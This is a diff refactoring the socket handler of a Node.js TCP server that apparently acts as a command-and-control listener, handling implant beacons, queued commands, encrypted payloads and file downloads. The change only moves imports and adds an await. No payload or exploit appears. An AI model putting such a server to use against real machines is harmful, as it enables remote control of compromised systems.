@@ -1,4 +1,5 @@
 const { createServer } = require('node:net');
+const { logInfo, logError } = require('../modules/logging');
 
 const config = require('../modules/config');
 
@@ -14,17 +15,16 @@ const server = createServer((socket) => {
     addClientSession(sessionId, socket);
     
     socket.on('data', async (payload) => {
-        const { logError } = require('../modules/logging');
-        const { upsertClientSession, getClient } = require('../modules/clients');
-        const { executeQueuedCommands } = require('../modules/queue');
-        const { decryptData } = require('../modules/encdec');
-        const { handleDownloadResponse, handleResponse, handleBeacon } = require('../modules/handlers');
-        
-        const payloadStr = payload.toString('utf8');
-
-        let client = getClient(sessionId);
-
         try {
+            const { upsertClientSession, getClient } = require('../modules/clients');
+            const { executeQueuedCommands } = require('../modules/queue');
+            const { decryptData } = require('../modules/encdec');
+            const { handleDownloadResponse, handleResponse, handleBeacon } = require('../modules/handlers');
+            
+            const payloadStr = payload.toString('utf8');
+    
+            let client = getClient(sessionId);
+
             if (payloadStr.length >= config.data.chunk_size || payloadStr.includes('--FIN--')) {
                 // chunk mode                            
                 upsertClientSession(sessionId, {waiting: true, buffer: client.buffer + payloadStr});
@@ -58,7 +58,7 @@ const server = createServer((socket) => {
                 } else if (response.error) {
                     logError(response.error);
                 } else {
-                    handleResponse(response);
+                    await handleResponse(response);
                 }
             }
         } catch(err) {
@@ -67,7 +67,6 @@ const server = createServer((socket) => {
     });
 
     socket.on('end', () => {
-        const { logInfo } = require('../modules/logging');
         const { getClient } = require('../modules/clients');
         const { upsertClientSession } = require('../modules/clients');
         
@@ -79,7 +78,6 @@ const server = createServer((socket) => {
     });
     
     socket.on('error', (err) => {
-        const { logError } = require('../modules/logging');
         const { getClient } = require('../modules/clients');
         const { upsertClientSession } = require('../modules/clients');
         
